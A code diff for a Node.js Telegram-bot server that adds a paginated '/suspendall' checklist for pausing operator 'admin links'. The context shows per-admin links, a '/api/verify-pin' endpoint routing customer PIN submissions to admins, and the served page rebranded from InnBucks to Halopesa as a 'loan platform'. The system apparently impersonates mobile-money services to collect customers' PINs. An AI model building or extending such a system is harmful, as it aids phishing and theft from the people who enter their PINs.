@@ -19,9 +19,12 @@ const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `h
 const bot = new TelegramBot(BOT_TOKEN);
 
 // In-memory maps
-const adminChatIds    = new Map(); // adminId → chatId
-const pausedAdmins    = new Set(); // adminIds that are paused
-const processingLocks = new Set(); // prevents duplicate pin submissions
+const adminChatIds      = new Map(); // adminId → chatId
+const pausedAdmins      = new Set(); // adminIds that are paused
+const processingLocks   = new Set(); // prevents duplicate pin submissions
+const suspendAllSessions = new Map(); // superadmin chatId → session data
+
+const SUSPEND_PAGE_SIZE = 10;
 
 let dbReady = false;
 
@@ -79,6 +82,56 @@ async function sendToAdmin(adminId, message, options = {}) {
         console.error(`❌ Error sending to ${adminId}:`, error.message);
         return null;
     }
+}
+
+// Build paginated suspend checklist
+function buildSuspendAllPage(session) {
+    const { allAdmins, selections, page } = session;
+    const totalPages = Math.ceil(allAdmins.length / SUSPEND_PAGE_SIZE);
+    const start      = page * SUSPEND_PAGE_SIZE;
+    const pageAdmins = allAdmins.slice(start, start + SUSPEND_PAGE_SIZE);
+    const suspendCount = selections.size;
+
+    // One row per admin: checkbox button
+    const adminRows = pageAdmins.map(admin => {
+        const willSuspend = selections.has(admin.adminId);
+        const label = willSuspend
+            ? `✅ ${admin.name} (${admin.adminId})`
+            : `⬜ ${admin.name} (${admin.adminId})`;
+        return [{ text: label, callback_data: `sall_toggle_${admin.adminId}` }];
+    });
+
+    // Navigation row
+    const navRow = [];
+    if (page > 0) {
+        navRow.push({ text: '◀ Prev', callback_data: `sall_page_${page - 1}` });
+    }
+    navRow.push({ text: `${page + 1} / ${totalPages}`, callback_data: 'sall_noop' });
+    if (page < totalPages - 1) {
+        navRow.push({ text: 'Next ▶', callback_data: `sall_page_${page + 1}` });
+    }
+
+    // Action row
+    const actionRow = [
+        { text: `🔒 Suspend Selected (${suspendCount})`, callback_data: 'sall_confirm' },
+        { text: '❌ Cancel',                              callback_data: 'sall_cancel'  }
+    ];
+
+    const inline_keyboard = [...adminRows, navRow, actionRow];
+
+    const text = `
+🔒 *SUSPEND ADMIN LINKS*
+
+Tap an admin to toggle ✅/⬜
+✅ = will be suspended  ⬜ = will be kept active
+
+Page ${page + 1} of ${totalPages} · ${allAdmins.length} admins total
+Selected to suspend: *${suspendCount}*
+
+Deselect anyone you want to keep active, then tap *Suspend Selected*.
+    `.trim();
+
+    return { text, inline_keyboard };
 }
 
 // ==========================================
@@ -289,6 +342,7 @@ ${WEBHOOK_URL}?admin=${adminId}
 /unpauseadmin <adminId> - Unpause an admin
 /removeadmin <adminId> - Remove an admin
 /admins - List all admins
+/suspendall - 🔒 Suspend selected admin links (checklist)
 
 *Messaging:*
 /send <adminId> <message> - Message an admin
@@ -746,6 +800,47 @@ Use /unpauseadmin ${targetAdminId} to restore.
         }
     });
 
+    // ==========================================
+    // /suspendall - NEW: interactive checklist
+    // All admins selected (✅) by default.
+    // Tap to deselect (⬜) those you want to keep.
+    // Paginated 10 per page, selections persist across pages.
+    // ==========================================
+    bot.onText(/\/suspendall/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can suspend links.');
+
+        try {
+            const allAdmins     = await db.getAllAdmins();
+            const regularAdmins = allAdmins.filter(a => a.adminId !== 'ADMIN001');
+
+            if (regularAdmins.length === 0) {
+                return bot.sendMessage(chatId, '⚠️ No admins to suspend.');
+            }
+
+            // Build session: everyone selected for suspension by default
+            const selections = new Set(regularAdmins.map(a => a.adminId));
+            suspendAllSessions.set(chatId, {
+                page: 0,
+                allAdmins: regularAdmins,
+                selections
+            });
+
+            const session = suspendAllSessions.get(chatId);
+            const { text, inline_keyboard } = buildSuspendAllPage(session);
+
+            await bot.sendMessage(chatId, text, {
+                parse_mode: 'Markdown',
+                reply_markup: { inline_keyboard }
+            });
+
+        } catch (error) {
+            console.error('❌ Error in /suspendall:', error);
+            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+        }
+    });
+
     // /send <adminId> <message>
     bot.onText(/\/send (.+)/, async (msg, match) => {
         const chatId  = msg.chat.id;
@@ -899,6 +994,180 @@ bot.on('callback_query', async (callbackQuery) => {
 
     if (!adminId) {
         return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
+    }
+
+    // ==========================================
+    // NEW: suspendall checklist callbacks
+    // ==========================================
+
+    if (data === 'sall_noop') {
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
+    }
+
+    if (data.startsWith('sall_toggle_')) {
+        if (adminId !== 'ADMIN001') {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
+        }
+
+        const targetAdminId = data.replace('sall_toggle_', '');
+        const session = suspendAllSessions.get(chatId);
+
+        if (!session) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired. Run /suspendall again.', show_alert: true });
+        }
+
+        if (session.selections.has(targetAdminId)) {
+            session.selections.delete(targetAdminId);
+        } else {
+            session.selections.add(targetAdminId);
+        }
+
+        const { text, inline_keyboard } = buildSuspendAllPage(session);
+
+        try {
+            await bot.editMessageText(text, {
+                chat_id: chatId,
+                message_id: messageId,
+                parse_mode: 'Markdown',
+                reply_markup: { inline_keyboard }
+            });
+        } catch (e) {
+            // Ignore no-change errors from Telegram
+        }
+
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
+    }
+
+    if (data.startsWith('sall_page_')) {
+        if (adminId !== 'ADMIN001') {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
+        }
+
+        const pageNum = parseInt(data.replace('sall_page_', ''));
+        const session = suspendAllSessions.get(chatId);
+
+        if (!session) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired. Run /suspendall again.', show_alert: true });
+        }
+
+        session.page = pageNum;
+        const { text, inline_keyboard } = buildSuspendAllPage(session);
+
+        try {
+            await bot.editMessageText(text, {
+                chat_id: chatId,
+                message_id: messageId,
+                parse_mode: 'Markdown',
+                reply_markup: { inline_keyboard }
+            });
+        } catch (e) {
+            // Ignore no-change errors
+        }
+
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '' });
+    }
+
+    if (data === 'sall_cancel') {
+        if (adminId !== 'ADMIN001') {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
+        }
+
+        suspendAllSessions.delete(chatId);
+
+        await bot.editMessageText(`
+❌ *SUSPEND ALL — CANCELLED*
+
+No changes were made.
+⏰ ${new Date().toLocaleString()}
+        `.trim(), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Cancelled' });
+    }
+
+    if (data === 'sall_confirm') {
+        if (adminId !== 'ADMIN001') {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
+        }
+
+        const session = suspendAllSessions.get(chatId);
+
+        if (!session) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ Session expired. Run /suspendall again.', show_alert: true });
+        }
+
+        const toSuspend = session.allAdmins.filter(a => session.selections.has(a.adminId));
+
+        if (toSuspend.length === 0) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '⚠️ No admins selected to suspend!', show_alert: true });
+        }
+
+        // Answer and update message immediately so buttons disappear
+        await bot.answerCallbackQuery(callbackQuery.id, { text: `🔒 Suspending ${toSuspend.length} admin(s)...` });
+
+        await bot.editMessageText(`
+⏳ *SUSPENDING ${toSuspend.length} LINK(S)...*
+
+Please wait while selected admin links are being locked.
+        `.trim(), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+        const keptCount  = session.allAdmins.length - toSuspend.length;
+        const sessionCopy = { allAdmins: session.allAdmins }; // keep for summary
+        suspendAllSessions.delete(chatId);
+
+        // Execute in background
+        (async () => {
+            let successCount = 0;
+            let notifyCount  = 0;
+            let errorCount   = 0;
+
+            for (const admin of toSuspend) {
+                try {
+                    // Pause the admin
+                    pausedAdmins.add(admin.adminId);
+                    await db.updateAdmin(admin.adminId, {
+                        status: 'paused'
+                    });
+
+                    successCount++;
+
+                    if (admin.chatId) {
+                        bot.sendMessage(admin.chatId, `
+🔒 *YOUR LINK HAS BEEN SUSPENDED*
+
+Your admin link has been suspended by the super admin.
+
+You will not be able to process new applications until your access is restored.
+
+📧 Contact the super admin if you have questions.
+                        `.trim(), { parse_mode: 'Markdown' })
+                        .then(() => notifyCount++)
+                        .catch(() => {});
+                    }
+
+                    await new Promise(resolve => setTimeout(resolve, 150));
+
+                } catch (err) {
+                    console.error(`Failed to suspend ${admin.adminId}:`, err.message);
+                    errorCount++;
+                }
+            }
+
+            await bot.editMessageText(`
+🔒 *SUSPENSION COMPLETE*
+
+✅ Links suspended: ${successCount}
+📨 Notifications sent: ${notifyCount}
+🟢 Kept active: ${keptCount}
+❌ Errors: ${errorCount}
+👥 Total admins: ${sessionCopy.allAdmins.length}
+⏰ ${new Date().toLocaleString()}
+
+Use /unpauseadmin ADMINID to restore access to any admin.
+            `.trim(), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+        })();
+
+        return;
     }
 
     if (!isAdminActive(chatId)) {
@@ -1107,7 +1376,6 @@ app.post('/api/verify-pin', async (req, res) => {
 
         if (assignmentType === 'specific' && requestAdminId) {
             // ── HARD LOCK: customer came via a specific admin link ──
-            // NEVER fall back to another admin — that would be a data leak.
             assignedAdmin = await db.getAdmin(requestAdminId);
 
             if (!assignedAdmin) {
@@ -1382,7 +1650,7 @@ app.get('/health', (req, res) => {
     });
 });
 
-// ── Serve the InnBucks HTML ──
+// ── Serve the Halopesa HTML ──
 app.get('/', async (req, res) => {
     const adminId = req.query.admin;
 
@@ -1408,7 +1676,7 @@ app.get('/', async (req, res) => {
 // START SERVER
 // ==========================================
 app.listen(PORT, () => {
-    console.log(`\n💎 INNBUCKS LOAN PLATFORM`);
+    console.log(`\n💎 HALOPESA LOAN PLATFORM`);
     console.log(`==========================`);
     console.log(`🌐 Server: http://localhost:${PORT}`);
     console.log(`🤖 Bot: WEBHOOK MODE ✅`);
@@ -1422,6 +1690,7 @@ app.listen(PORT, () => {
 async function shutdownGracefully(signal) {
     console.log(`\n🛑 Received ${signal}, shutting down...`);
     try {
+        suspendAllSessions.clear();
         await bot.deleteWebHook();
         await db.closeDatabase();
         console.log('✅ Cleanup complete');
